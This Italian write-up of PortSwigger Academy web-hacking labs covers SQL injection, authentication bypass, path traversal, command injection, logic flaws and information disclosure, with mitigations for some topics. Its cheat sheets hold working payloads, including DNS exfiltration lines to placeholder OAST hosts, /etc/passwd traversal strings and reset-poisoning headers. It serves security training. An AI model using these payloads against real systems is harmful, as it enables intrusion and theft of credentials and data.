# 🛡️ Web Application Penetration Testing: Comprehensive Write-ups & Methodology
**Autore:** Gabriele Cireddu

Questo documento raccoglie metodologie, write-up e script di automazione derivanti dal completamento del percorso formativo della **PortSwigger Web Security Academy** ancora in corso di svolgimento. Sebbene i laboratori dell'Academy siano nativamente progettati per insegnare l'utilizzo di Burp Suite, ho deciso di affrontare questo percorso utilizzando prevalentemente **OWASP ZAP (ZED Attack Proxy)**. 

L'obiettivo è dimostrare un approccio "tool-agnostic" allo sfruttamento delle vulnerabilità. L'automazione di task complessi è stata implementata scrivendo script custom *ECMAScript* integrati nel motore di ZAP, il cui codice sorgente è condiviso in appendice. Le tecniche di fuzzing e interazione out-of-band sono state adattate per sfruttare gli strumenti nativi di ZAP.

---

## 📑 Indice Principale

*   [Parte 1: Server-Side Vulnerabilities](#parte-1-server-side-vulnerabilities)
    *   [1. SQL Injection (SQLi)](#1-sql-injection-sqli)
        *   [1.1 Bypass della Logica e Recupero Dati Nascosti](#11-bypass-della-logica-e-recupero-dati-nascosti)
        *   [1.2 UNION-Based SQL Injection](#12-union-based-sql-injection)
        *   [1.3 Iniezione in contesti non standard (XML/JSON)](#13-iniezione-in-contesti-non-standard-xmljson)
        *   [1.4 Error-Based SQL Injection](#14-error-based-sql-injection)
        *   [1.5 Blind SQL Injection (Boolean & Time-Based)](#15-blind-sql-injection-boolean--time-based)
        *   [1.6 Out-Of-Band (OAST) SQL Injection](#16-out-of-band-oast-sql-injection)
        *   [1.7 SQL Injection Cheat Sheet](#17-sql-injection-cheat-sheet)
    *   [2. Authentication](#2-authentication)
        *   [2.1 Username Enumeration](#21-username-enumeration)
        *   [2.2 Bypass del Rate Limiting e Account Lockout](#22-bypass-del-rate-limiting-e-account-lockout)
        *   [2.3 Vulnerabilità nei meccanismi di recupero e sessione](#23-vulnerabilità-nei-meccanismi-di-recupero-e-sessione)
        *   [2.4 Attacchi al Multi-Factor Authentication (2FA/OTP)](#24-attacchi-al-multi-factor-authentication-2faotp)
    *   [3. Path Traversal (Directory Traversal)](#3-path-traversal-directory-traversal)
        *   [3.1 Concetti Base e Sfruttamento Standard](#31-concetti-base-e-sfruttamento-standard)
        *   [3.2 Tecniche di Bypass (Evasione dei Filtri)](#32-tecniche-di-bypass-evasione-dei-filtri)
        *   [3.3 Prevenzione e Mitigazione](#33-prevenzione-e-mitigazione)
    *   [4. OS Command Injection](#4-os-command-injection)
        *   [4.1 Concetti Base e Metacaratteri della Shell](#41-concetti-base-e-metacaratteri-della-shell)
        *   [4.2 Comandi Utili di Enumerazione](#42-comandi-utili-di-enumerazione)
        *   [4.3 Blind OS Command Injection](#43-blind-os-command-injection)
        *   [4.4 Prevenzione e Mitigazione](#44-prevenzione-e-mitigazione)
    *   [5. Business Logic Vulnerabilities](#5-business-logic-vulnerabilities)
        *   [5.1 Eccessiva Fiducia nei Controlli Client-Side](#51-eccessiva-fiducia-nei-controlli-client-side)
        *   [5.2 Gestione Inadeguata di Input Non Convenzionali](#52-gestione-inadeguata-di-input-non-convenzionali)
        *   [5.3 Violazione del Flusso di Esecuzione (State Machine Bypass)](#53-violazione-del-flusso-di-esecuzione-state-machine-bypass)
        *   [5.4 Omissione di Parametri Obbligatori](#54-omissione-di-parametri-obbligatori)
        *   [5.5 Discrepanze di Parsing e Truncation Flaws](#55-discrepanze-di-parsing-e-truncation-flaws)
        *   [5.6 Vulnerabilità Domain-Specific (Race Conditions e Flussi Logici)](#56-vulnerabilità-domain-specific-race-conditions-e-flussi-logici)
    *   [6. Information Disclosure](#6-information-disclosure)
        *   [6.1 Messaggi di Errore Verbosi](#61-messaggi-di-errore-verbosi)
        *   [6.2 Dati di Debug e Commenti degli Sviluppatori](#62-dati-di-debug-e-commenti-degli-sviluppatori)
        *   [6.3 File per Web Crawler e File di Backup](#63-file-per-web-crawler-e-file-di-backup)
        *   [6.4 Version Control History (Cartella .git esposta)](#64-version-control-history-cartella-git-esposta)
        *   [6.5 Configurazioni Insicure e Metodi HTTP (TRACE)](#65-configurazioni-insicure-e-metodi-http-trace)
        *   [6.6 Mitigazione e Prevenzione](#66-mitigazione-e-prevenzione)
    *   [7. Access Control & Privilege Escalation](#7-access-control--privilege-escalation)
        *   [7.1 Vertical Privilege Escalation](#71-vertical-privilege-escalation)
        *   [7.2 Bypass a livello di Piattaforma (Misconfigurations)](#72-bypass-a-livello-di-piattaforma-misconfigurations)
        *   [7.3 Insecure Direct Object References (IDOR)](#73-insecure-direct-object-references-idor)
        *   [7.4 Vulnerabilità in Processi Multi-Step](#74-vulnerabilità-in-processi-multi-step)
        *   [7.5 Referer-Based Access Control](#75-referer-based-access-control)
        *   [7.6 Prevenzione e Mitigazione](#76-prevenzione-e-mitigazione)
*   [Parte 2: Client-Side Vulnerabilities](#parte-2-client-side-vulnerabilities)
*   [Parte 3: Advanced Topics](#parte-3-advanced-topics)
*   [Appendice: OWASP ZAP Automation Scripts](#appendice-owasp-zap-automation-scripts)
    *   [Authentication Scripts](#authentication-scripts)

---

## Parte 1: Server-Side Vulnerabilities
Le vulnerabilità server-side permettono agli attaccanti di compromettere l'infrastruttura di backend, accedere a dati sensibili o manipolare la logica dell'applicazione.

### 1. SQL Injection (SQLi)
La SQL Injection consente a un attaccante di interferire con le query che un'applicazione web effettua al proprio database, permettendo il recupero di dati nascosti, la sovversione della logica di business e, in casi critici, l'esecuzione di comandi sul sistema operativo sottostante.

#### 1.1 Bypass della Logica e Recupero Dati Nascosti
Se l'input dell'utente non è sanitizzato, è possibile alterare la struttura della query SQL. 
*   **Recupero dati:** Aggiungendo una condizione sempre vera (es. `' OR 1=1--`), è possibile forzare il database a restituire tutti i record ignorando i filtri.
*   **Login Bypass:** Commentando il resto della query, si può bypassare il controllo della password. Inviando come username `administrator'--`, la query ignorerà la clausola `AND password = '...'`, garantendo l'accesso.

#### 1.2 UNION-Based SQL Injection
Quando l'applicazione restituisce a schermo i risultati di una query, è possibile utilizzare l'operatore `UNION` per accodare i risultati di una query arbitraria. 

**1. Determinare il numero di colonne:**
```sql
' ORDER BY 1--
' ORDER BY 2--
-- (Si incrementa fino a generare un errore del database)
```
In alternativa, si può usare l'iniezione di `NULL`:
```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
```

**2. Individuare le colonne di tipo testuale:**
Sostituendo iterativamente i valori `NULL` con una stringa (es. `'a'`), si verifica quale colonna accetta dati testuali senza errori.

**3. Estrazione dei dati e Concatenazione:**
```sql
-- Oracle / PostgreSQL
' UNION SELECT username || '~' || password FROM users--

-- Microsoft SQL Server
' UNION SELECT username + '~' + password FROM users--
```

#### 1.3 Iniezione in contesti non standard (XML/JSON)
Se l'applicazione elabora dati JSON o XML, i WAF (Web Application Firewall) possono essere bypassati sfruttando la codifica nativa del formato (es. Entità Esadecimali XML):
```xml
<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
```

#### 1.4 Error-Based SQL Injection
Quando l'applicazione non mostra i dati estratti ma gestisce male gli errori del database, è possibile forzare il DB a restituire messaggi di errore parlanti (Verbose Errors).
```sql
-- Forzare un errore di casting (PostgreSQL)
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

#### 1.5 Blind SQL Injection (Boolean & Time-Based)
Nelle SQLi Cieche, l'estrazione avviene ponendo domande al database con risposta Vero/Falso.

**1. Boolean-Based (Risposte Condizionali):**
Si analizza un cambiamento nel comportamento dell'applicazione.
```sql
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), 1, 1) = 's'--
```

**2. Time-Based (Ritardi Temporali):**
Si forza il database ad attendere un tot di secondi se la condizione è vera. Con ZAP Fuzzer, si ordinano i risultati per RTT (Round Trip Time).
```sql
-- PostgreSQL
'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

#### 1.6 Out-Of-Band (OAST) SQL Injection
Quando le query vengono eseguite in modo asincrono, si forza il database a risolvere un dominio DNS controllato dall'attaccante. In ZAP si utilizza l'add-on **OAST**.
```sql
-- Microsoft SQL Server (Esfiltrazione via DNS)
'; declare @p varchar(1024); set @p=(SELECT password FROM users WHERE username='administrator'); exec('master..xp_dirtree "//'+@p+'[.mio-server-oast.com/a](https://.mio-server-oast.com/a)"')--
```

#### 1.7 SQL Injection Cheat Sheet
Di seguito le sintassi specifiche per i principali motori di database (Oracle, Microsoft SQL Server, PostgreSQL, MySQL) utili durante le fasi di exploitation.

**1. Concatenazione di stringhe (*String concatenation*)**
*   **Oracle:** `'foo'||'bar'`
*   **Microsoft:** `'foo'+'bar'`
*   **PostgreSQL:** `'foo'||'bar'`
*   **MySQL:** `'foo' 'bar'` *(nota lo spazio)* oppure `CONCAT('foo','bar')`

**2. Sottostringhe (*Substring*)**
*Nota: L'indice di offset parte da 1.*
*   **Oracle:** `SUBSTR('foobar', 4, 2)`
*   **Microsoft:** `SUBSTRING('foobar', 4, 2)`
*   **PostgreSQL:** `SUBSTRING('foobar', 4, 2)`
*   **MySQL:** `SUBSTRING('foobar', 4, 2)`

**3. Commenti (*Comments*)**
*   **Oracle:** `--comment`
*   **Microsoft:** `--comment` oppure `/*comment*/`
*   **PostgreSQL:** `--comment` oppure `/*comment*/`
*   **MySQL:** `#comment` oppure `-- comment` *(nota lo spazio dopo il doppio trattino)* oppure `/*comment*/`

**4. Versione del Database (*Database version*)**
*   **Oracle:** `SELECT banner FROM v$version` oppure `SELECT version FROM v$instance`
*   **Microsoft:** `SELECT @@version`
*   **PostgreSQL:** `SELECT version()`
*   **MySQL:** `SELECT @@version`

**5. Contenuto del Database (*Database contents*)**
*   **Oracle:** `SELECT * FROM all_tables` | `SELECT * FROM all_tab_columns WHERE table_name = 'TABELLA'`
*   **Microsoft / PostgreSQL / MySQL:** `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABELLA'`

**6. Errori Condizionali (*Conditional errors*)**
*   **Oracle:** `SELECT CASE WHEN (CONDIZIONE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`
*   **Microsoft:** `SELECT CASE WHEN (CONDIZIONE) THEN 1/0 ELSE NULL END`
*   **PostgreSQL:** `1 = (SELECT CASE WHEN (CONDIZIONE) THEN 1/(SELECT 0) ELSE NULL END)`
*   **ML:** `SELECT IF(CONDIZIONE,(SELECT table_name FROM information_schema.tables),'a')`

**7. Estrazione dati via errori visibili (*Visible error messages*)**
*   **Microsoft:** `SELECT 'foo' WHERE 1 = (SELECT 'secret')`
*   **PostgreSQL:** `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`
*   **MySQL:** `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))`

**8. Ritardi Temporali (*Time delays*)**
*   **Oracle:** `dbms_pipe.receive_message(('a'),10)`
*   **Microsoft:** `WAITFOR DELAY '0:0:10'`
*   **PostgreSQL:** `SELECT pg_sleep(10)`
*   **MySQL:** `SELECT SLEEP(10)`

**9. Ritardi Temporali Condizionali (*Conditional time delays*)**
*   **Or:** `SELECT CASE WHEN (CONDIZIONE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`
*   **Microsoft:** `IF (CONDIZIONE) WAITFOR DELAY '0:0:10'`
*   **PostgreSQL:** `SELECT CASE WHEN (CONDIZIONE) THEN pg_sleep(10) ELSE pg_sleep(0) END`
*   **MySQL:** `SELECT IF(CONDIZIONE,SLEEP(10),'a')`

**10. DNS Lookup & Esfiltrazione OAST**
*   **Or:** `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT QUERY)||'.TUO-OAST.com/"> %remote;]>'),'/l') FROM dual`
*   **Mcs:** `declare @p varchar(1024);set @p=(SELECT QUERY);exec('master..xp_dirtree "//'+@p+'.TUO-OAST.com/a"')`
*   **Pg:** `copy (SELECT '') to program 'nslookup '||(SELECT QUERY)||'.TUO-OAST.com'`
*   **MySQL (Solo Windows):** `SELECT QUERY INTO OUTFILE '\\\\TUO-OAST.com\a'`

---

### 2. Authentication

#### 2.1 Username Enumeration
Prima di attaccare le password, è necessario ottenere nomi utente validi. Le applicazioni spesso "tradiscono" l'esistenza di un utente attraverso differenze sottili.
*   **Enumerazione basata sul contenuto:** Analizzare le risposte del server a tentativi di login errati. Un messaggio come *"Password errata"* invece di *"Utente non trovato"*, o una semplice differenza nella lunghezza del body della risposta HTTP, conferma l'esistenza dell'utente target.
*   **Enumerazione Time-Based (RTT):** Se il server impiega visibilmente più tempo a rispondere quando viene inserito un utente esistente, possiamo enumerare gli utenti misurando i Round Trip Time.
*   **Enumerazione via URL:** Controllare sempre logiche deboli, come l'accesso diretto a profili tramite parametri prevedibili (`?id=nomeutente`).

#### 2.2 Bypass del Rate Limiting e Account Lockout
*   **IP Spoofing (X-Forwarded-For):** Se il firewall blocca in base all'IP, è possibile iniettare l'header `X-Forwarded-For: 127.0.0.1` e ruotare l'IP fittizio ad ogni richiesta per evadere il controllo (vedi script in Appendice).
*   **Logic Flaw nel Reset del Contatore:** Alcuni sistemi azzerano i tentativi falliti non appena rilevano un login *corretto* dallo stesso IP. L'attaccante può usare le proprie credenziali valide ogni N tentativi per resettare il blocco.
*   **Bypass tramite Array JSON:** Se il login accetta formati JSON, inviando un array di password (`{"username":"carlos", "password":["pass1", "pass2"]}`), il server potrebbe testarle tutte contemporaneamente, bypassando il lockout applicato per singola richiesta HTTP.

#### 2.3 Vulnerabilità nei meccanismi di recupero e sessione
*   **Password Reset Poisoning:** Aggiungendo l'header `X-Forwarded-Host: attacker.com` alla richiesta di reset, se il middleware si fida di questo header, il server genererà il link facendolo puntare al server dell'attaccante.
*   **Token Prevedibili:** I cookie/token generati usando logiche reversibili (Base64) o hash deboli (MD5) possono essere decodificati.

#### 2.4 Attacchi al Multi-Factor Authentication (2FA/OTP)
*   **OTP Brute-Forcing e Gestione Stato:** I codici a 4/6 cifre possono essere forzati matematicamente. Se gli sviluppatori non invalidano il vecchio codice OTP dopo un login parziale, è possibile automatizzare la richiesta in background per sbloccare l'account mantenendo l'OTP invariato (vedi script in Appendice).

---

### 3. Path Traversal (Directory Traversal)
Le vulnerabilità di Path Traversal consentono a un attaccante di leggere file arbitrari sul server che ospita l'applicazione. Sfruttando questa falla, è possibile accedere al codice sorgente dell'applicazione, a credenziali di sistemi back-end o a file critici del sistema operativo (es. file di configurazione o hash delle password). In alcuni scenari, se i permessi lo consentono, è perfino possibile sovrascrivere file per ottenere l'esecuzione remota di codice (RCE).

#### 3.1 Concetti Base e Sfruttamento Standard
Molte applicazioni caricano risorse (come immagini o documenti) passando il nome del file tramite un parametro, ad esempio:
```http
GET /loadImage?filename=218.png
```
Se il server concatena ciecamente questo input a una directory base (es. `/var/www/images/`) senza alcuna validazione, un attaccante può iniettare la sequenza di attraversamento delle directory `../` (che significa "sali di un livello") per uscire dalla cartella prevista e navigare fino alla radice del filesystem.

**Esempi di Payload Base:**
*   **Sistemi Unix/Linux:** Estrazione del file degli utenti registrati.
```http
/loadImage?filename=../../../etc/passwd
```
*   **Sistemi Windows:** Su Windows sono valide sia le sequenze `../` che `..\`.
```http
/loadImage?filename=..\..\..\windows\win.ini
```

#### 3.2 Tecniche di Bypass (Evasione dei Filtri)
Gli sviluppatori spesso implementano difese rudimentali contro il path traversal che possono essere facilmente aggirate. Di seguito le tecniche di evasione classiche:

**1. Utilizzo di Percorsi Assoluti** 
Se l'applicazione blocca o rimuove specificamente le stringhe `../`, potrebbe non controllare i percorsi assoluti. È possibile ignorare l'attraversamento e puntare direttamente alla radice:
```http
filename=/etc/passwd
```

**2. Stripping Non-Ricorsivo (Sequenze Annidate)** 
Se il server elimina la sequenza `../` ma lo fa una sola volta senza ricorsione, l'attaccante può "annidare" le sequenze. Quando il filtro rimuove la stringa interna, i caratteri rimanenti si ricongiungeranno formando una nuova sequenza valida:
```http
filename=....//....//....//etc/passwd
-- oppure --
filename=....\/....\/....\/etc/passwd
```

**3. URL Encoding e Double URL Encoding** 
I server web o i WAF potrebbero rimuovere le sequenze `../` prima di passare l'input all'applicazione. Codificando i caratteri, il WAF lascerà passare il payload, che verrà poi decodificato dal backend.
*   URL Encoding semplice: `%2e%2e%2f`
*   Double URL Encoding: `%252e%252e%252f`
*   Encoding non standard: `..%c0%af` oppure `..%ef%bc%8f`

*Metodologia con OWASP ZAP:* Invece di testare manualmente le codifiche, è consigliabile inviare la richiesta al **Fuzzer di ZAP** e utilizzare le wordlist native incluse nel tool (es. *DirBuster* o le wordlist *SecLists* per il Path Traversal) che contengono già tutte le permutazioni codificate necessarie per evadere i filtri.

**4. Validazione della Directory Base (Base Folder Bypass)** 
Se l'applicazione verifica rigorosamente che l'input inizi con la directory prevista (es. `/var/www/images`), è sufficiente fornire la cartella richiesta e poi iniziare il traversal subito dopo:
```http
filename=/var/www/images/../../../etc/passwd
```

**5. Validazione dell'Estensione tramite Null Byte Bypass** 
Se l'applicazione verifica che il nome del file termini con un'estensione specifica (es. `.png`), un attaccante può usare il carattere Null Byte (`%00`) per far credere al linguaggio di programmazione (in particolare C/C++ o vecchie versioni di PHP) che la stringa sia terminata, ignorando l'estensione che segue:
```http
filename=../../../etc/passwd%00.png
```

#### 3.3 Prevenzione e Mitigazione
Il modo più efficace per prevenire il path traversal è evitare del tutto di passare l'input fornito dall'utente alle API del filesystem, utilizzando identificatori indiretti (es. mappare un ID nel database al nome reale del file). 

Se passare l'input dell'utente è inevitabile, si raccomanda di utilizzare due livelli di difesa:
1.  **Validazione dell'input:** Verificare l'input rispetto a una rigida *whitelist* di valori consentiti, o assicurarsi che contenga esclusivamente caratteri alfanumerici (rifiutando punti e slash).
2.  **Canonicalizzazione del percorso:** Aggiungere l'input alla directory di base e utilizzare un'API del filesystem per risolvere (canonicalizzare) il percorso, rimuovendo le sequenze logiche. Successivamente, verificare che il percorso assoluto finale inizi ancora con la directory base prevista.

Di seguito un esempio di implementazione sicura in **Java**:
```java
File file = new File(BASE_DIRECTORY, userInput);
// La funzione getCanonicalPath() risolve tutti i ../ e ./ reali
if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    // Il file si trova effettivamente all'interno della cartella sicura
    // Procedi con l'elaborazione del file
} else {
    // Tentativo di Path Traversal rilevato. Blocca l'esecuzione.
}
```

---

### 4. OS Command Injection
La vulnerabilità di OS Command Injection (Iniezione di comandi del sistema operativo) si verifica quando un'applicazione web passa dati non sicuri e non validati a una shell di sistema. Ciò consente a un attaccante di eseguire comandi arbitrari sul server che ospita l'applicazione, compromettendo l'intera infrastruttura.

#### 4.1 Concetti Base e Metacaratteri della Shell
Spesso le applicazioni utilizzano script legacy o comandi di sistema per eseguire operazioni di backend (es. `stockreport.pl <productID> <storeID>`). Se l'input non è sanitizzato, l'attaccante può utilizzare i **metacaratteri della shell** per terminare il comando previsto ed eseguirne uno proprio.

Di seguito i principali separatori di comando utilizzabili:
*   **Windows e Unix:** `&`, `&&`, `|`, `||`
*   **Solo Unix/Linux:** `;` (punto e virgola), `\n` (New Line)
*   **Esecuzione Inline (Unix):** `` `comando` `` (Backticks), `$(comando)`

Se l'input dell'attaccante viene inserito all'interno di una stringa racchiusa tra virgolette nel comando originale, sarà necessario terminare il contesto prima di iniettare i metacaratteri (es. `" || whoami || "`).

**Esempio di Payload Base:**
```bash
# Iniettato nel parametro productID
productId=1 & echo aiwefwlguh &
productId=1 | whoami
```

#### 4.2 Comandi Utili di Enumerazione
Una volta confermata la vulnerabilità, è fondamentale mappare il sistema compromesso.

| Scopo dell'Enumerazione | Linux | Windows |
| :--- | :--- | :--- |
| **Nome dell'utente corrente** | `whoami` | `whoami` |
| **Sistema operativo e Versione** | `uname -a` | `ver` |
| **Configurazione di rete** | `ifconfig` | `ipconfig /all` |
| **Connessioni di rete attive** | `netstat -an` | `netstat -an` |
| **Processi in esecuzione** | `ps -ef` | `tasklist` |

#### 4.3 Blind OS Command Injection
Nella maggior parte dei casi reali, l'output del comando iniettato non viene restituito nella risposta HTTP (Vulnerabilità Cieca). È necessario utilizzare tecniche alternative per confermare l'esecuzione e recuperare i dati.

##### 1. Rilevamento tramite Ritardi Temporali (Time-Based)
È possibile indurre l'applicazione a ritardare la risposta HTTP utilizzando comandi come `ping` o `sleep`.
```bash
# Il comando ping invia 10 pacchetti causando un ritardo di ~10 secondi
email=test@test.com || ping -c 10 127.0.0.1 ||
```
*Nota metodologica:* Quando si inviano i payload tramite proxy o fuzzer (come ZAP), i metacaratteri come `&` o lo spazio devono essere sottoposti a URL Encoding (es. `%26` per `&`, `%2D` per `-`, `+` per lo spazio).

##### 2. Esfiltrazione tramite Reindirizzamento (Output Redirection)
Se l'applicazione serve file statici da una directory nota (es. `/var/www/images/`), è possibile reindirizzare l'output del comando in un nuovo file all'interno di quella cartella utilizzando l'operatore `>`.
```bash
# Esecuzione e reindirizzamento
email=test@test.com & whoami > /var/www/images/whoami.txt &
```
Successivamente, l'attaccante può navigare direttamente all'URL `/images/whoami.txt` tramite il browser per leggere l'output.

##### 3. Esfiltrazione Out-Of-Band (OAST)
Nei casi in cui il firewall blocca le richieste in entrata ai file scritti, si sfrutta il protocollo DNS (che è quasi sempre autorizzato in uscita). Utilizzando tool come l'add-on **OAST di ZAP** o **Interactsh**, si inietta un comando che risolve un dominio controllato dall'attaccante.

Per esfiltrare i dati in tempo reale, si esegue il comando target all'interno di backticks (`` ` ``) e si concatena l'output come sottodominio della richiesta DNS:
```bash
# L'output di whoami diventa il sottodominio
& nslookup `whoami`.tuo-server-oast.com &
```
Se l'utente corrente è `www-data`, il server DNS dell'attaccante registrerà una richiesta in entrata per `www-data.tuo-server-oast.com`.

#### 4.4 Prevenzione e Mitigazione
La prevenzione definitiva si ottiene **non chiamando mai comandi del sistema operativo direttamente dal codice sorgente**. La funzionalità richiesta dovrebbe essere implementata utilizzando le API native e sicure del linguaggio di programmazione o del framework utilizzato.

Qualora la chiamata a una shell di sistema sia assolutamente inevitabile:
*   Implementare una validazione rigorosa dell'input tramite **Whitelist** (es. accettare solo ID numerici).
*   Verificare che l'input contenga esclusivamente caratteri alfanumerici.
*   **Non affidarsi alla sanitizzazione (Escape dei caratteri):** le tecniche di blacklisting o escaping dei metacaratteri si dimostrano storicamente fragili e aggirabili da attaccanti esperti.

---

### 5. Business Logic Vulnerabilities
Le vulnerabilità di logica di business sono difetti nella progettazione e nell'implementazione di un'applicazione che consentono a un attaccante di indurre comportamenti imprevisti. Non derivano da errori di sintassi nel codice (come la SQL Injection), ma da **assunzioni errate** fatte dagli sviluppatori sul comportamento degli utenti o sugli stati dell'applicazione. 

Essendo strettamente legate al dominio specifico dell'applicazione, queste falle sfuggono quasi sempre agli scanner di vulnerabilità automatizzati, richiedendo analisi manuale e pensiero critico.

#### 5.1 Eccessiva Fiducia nei Controlli Client-Side
Uno degli errori più comuni è assumere che l'utente interagirà con l'applicazione esclusivamente tramite l'interfaccia web fornita (il browser), affidandosi a validazioni lato client o a campi nascosti (Hidden Fields).
*   **Manipolazione dei Prezzi:** In un e-commerce, il prezzo di un articolo potrebbe essere inviato al server tramite una richiesta `POST` (es. `price=1337`). 
*   **Metodologia (ZAP Proxy):** Intercettando il traffico prima che raggiunga il server, l'attaccante può alterare il valore arbitrariamente, impostando ad esempio il prezzo a `0` o a importi inferiori al credito disponibile, completando l'acquisto senza sborsare fondi reali.

#### 5.2 Gestione Inadeguata di Input Non Convenzionali
Le applicazioni spesso non gestiscono correttamente input estremi o tipi di dati imprevisti. 
*   **Integer Overflow / Underflow:** I linguaggi di programmazione e i database hanno limiti massimi per i valori interi (es. 2.147.483.647 per un intero a 32 bit). 
*   **Exploitation:** Utilizzando lo **ZAP Fuzzer**, è possibile inviare centinaia di richieste in rapida successione per aggiungere quantità massicce di un articolo al carrello (es. 99 unità per volta). Superando il valore intero massimo, il prezzo totale va in "overflow", diventando un numero negativo enorme. Aggiungendo poi altri articoli calcolati ad hoc, si può portare il totale del carrello in positivo ma al di sotto del proprio saldo residuo.

#### 5.3 Violazione del Flusso di Esecuzione (State Machine Bypass)
Molti processi aziendali (come il checkout di un ordine o l'autenticazione a due fattori) seguono una sequenza rigorosa di step (es. *Carrello -> Pagamento -> Conferma*). Gli sviluppatori spesso assumono che l'utente non possa raggiungere lo Step 3 senza aver superato lo Step 2.
*   **Forced Browsing:** Un attaccante può saltare i passaggi intermedi navigando direttamente agli URL finali. 
*   **Bypass del Pagamento:** Navigare forzatamente verso `/cart/order-confirmation?order-confirmation=true` dopo aver messo gli oggetti nel carrello, ma senza aver inviato i dettagli di pagamento.
*   **Bypass del 2FA:** Dopo aver inserito username e password validi, invece di inserire il codice OTP, l'attaccante modifica l'URL nel browser per puntare direttamente a `/my-account`. Se lo stato di "loggato" viene impostato al primo step e non verificato al secondo, l'accesso viene garantito.

#### 5.4 Omissione di Parametri Obbligatori
Gli sviluppatori possono scrivere codice che decide il flusso di esecuzione in base alla presenza o al valore di un parametro. Ma cosa succede se il parametro viene rimosso completamente dalla richiesta HTTP?
*   **Password Reset Logic:** In una richiesta di modifica password (`POST /my-account/change-password`), il server potrebbe aspettarsi il parametro `current-password`. Se l'attaccante elimina completamente questo parametro dal body della richiesta e imposta l'username della vittima, il backend potrebbe andare in eccezione non gestita (o saltare il blocco di controllo `if(current_password == db_password)`), procedendo direttamente al salvataggio della nuova password.

#### 5.5 Discrepanze di Parsing e Truncation Flaws
Questi difetti emergono quando due componenti dell'architettura trattano la stessa stringa in modo diverso (es. l'applicazione web rispetto al Database).
*   **Bypass delle Restrizioni di Dominio (Registrazione Email):** Se la registrazione è limitata a dipendenti aziendali (es. `@dontwannacry.com`), ma il database tronca i campi a 255 caratteri, un attaccante può registrare un'email malevola appositamente formattata:
```http
stringa_lunghissima_fino_a_238_caratteri@dontwannacry.com.server-hacker.net
```
L'email di convalida verrà inviata regolarmente al server DNS dell'attaccante (`server-hacker.net`). Tuttavia, al momento del salvataggio, il database troncherà la stringa esattamente a 255 caratteri (rimuovendo `.server-hacker.net`), salvando nel sistema l'identità legittima `...@dontwannacry.com` e garantendo l'accesso ad aree riservate (es. Admin Panel).

#### 5.6 Vulnerabilità Domain-Specific (Race Conditions e Flussi Logici)
Alcune vulnerabilità risiedono nelle specifiche regole di business, come sconti, coupon e carte regalo.
*   **Infinite Money Logic Flaw:** Se un e-commerce permette di acquistare una Gift Card da 10$ e applicare un coupon di sconto del 30% (pagando quindi 7$), l'attaccante otterrà una Gift Card valida per ricaricare 10$ sul proprio account, lucrando 3$ per ogni transazione.
*   **Automazione con ZAP:** Questa operazione ripetitiva (Aggiungi al carrello -> Applica Sconto -> Checkout -> Estrai Codice Gift Card -> Riscatta) può essere automatizzata su OWASP ZAP tramite la registrazione di uno script **Zest (Macro)** o scrivendo uno script **HTTP Sender** che parsi le risposte, estragga il codice via regex e generi la richiesta successiva di riscatto, iterando il processo fino all'esaurimento dei fondi desiderati.

---

### 6. Information Disclosure
L'Information Disclosure (o Information Leakage) si verifica quando un sito web rivela involontariamente informazioni sensibili agli utenti. Sebbene a volte vengano esposti direttamente dati critici (es. dati finanziari), molto più spesso vengono trapelati dettagli tecnici (versioni di framework, strutture di directory, codice sorgente, header interni). Queste informazioni, nelle mani di un attaccante, fungono da tassello fondamentale per la costruzione di catene di exploit ad alta gravità.

#### 6.1 Messaggi di Errore Verbosi
Inviare input imprevisti (Fuzzing) è il metodo principale per far fallire la logica dell'applicazione e generare eccezioni.
*   **Type Mismatch:** Se un parametro si aspetta un intero (es. `productId=1`), inviando una stringa o un carattere speciale (es. `productId="example"`) si può generare un'eccezione non gestita.
*   **Impatto:** L'applicazione potrebbe restituire uno stack trace completo, rivelando le tecnologie in uso e la loro versione esatta (es. `Apache Struts 2 2.3.31`). Conoscere la versione esatta permette all'attaccante di cercare CVE pubbliche e applicare exploit noti.

#### 6.2 Dati di Debug e Commenti degli Sviluppatori
Durante la fase di sviluppo, vengono spesso lasciati commenti HTML o attivate pagine di diagnostica che si dimentica di rimuovere in produzione.
*   **Pagine di Debug:** Utilizzando lo *Spider* di ZAP o analizzando il codice sorgente tramite lo strumento *Search*, è possibile scovare commenti HTML contenenti link a script di diagnostica (es. `/cgi-bin/phpinfo.php`).
*   **Impatto:** L'accesso a queste pagine rivela l'intero stato di runtime del server, incluse variabili d'ambiente critiche come `SECRET_KEY` o le credenziali dei database.

#### 6.3 File per Web Crawler e File di Backup
Gli sviluppatori usano file come `/robots.txt` o `/sitemap.xml` per direzionare i motori di ricerca.
*   **Scoperta di Directory Nascoste:** Il file `robots.txt` spesso vieta l'indicizzazione di cartelle sensibili (es. `Disallow: /backup`).
*   **File di Backup:** Molti editor di testo creano file temporanei aggiungendo estensioni come `.bak` o `~`. Navigando nella cartella nascosta scoperta, un attaccante potrebbe trovare file come `ProductTemplate.java.bak`. Richiedendo questo file, il server web lo restituirà come testo semplice (non eseguendolo come farebbe con un `.java` o `.php`), rivelando il codice sorgente e potenziali credenziali hard-coded (es. stringhe di connessione a Postgres).

#### 6.4 Version Control History (Cartella .git esposta)
Se un sito web viene distribuito in modo errato, la cartella `.git` potrebbe essere pubblicamente accessibile.
*   **Esfiltrazione del Repository:** Un attaccante può scaricare l'intera directory (su Linux tramite `wget -r https://target.com/.git/`).
*   **Analisi Locale:** Una volta scaricata, utilizzando i comandi Git standard (`git log`, `git diff`), è possibile navigare nella cronologia dei commit. Spesso, credenziali hard-coded che sono state "rimosse" nei commit recenti rimangono perfettamente visibili nella storia delle modifiche del file (es. analizzando i diff di un file `admin.conf`).

#### 6.5 Configurazioni Insicure e Metodi HTTP (TRACE)
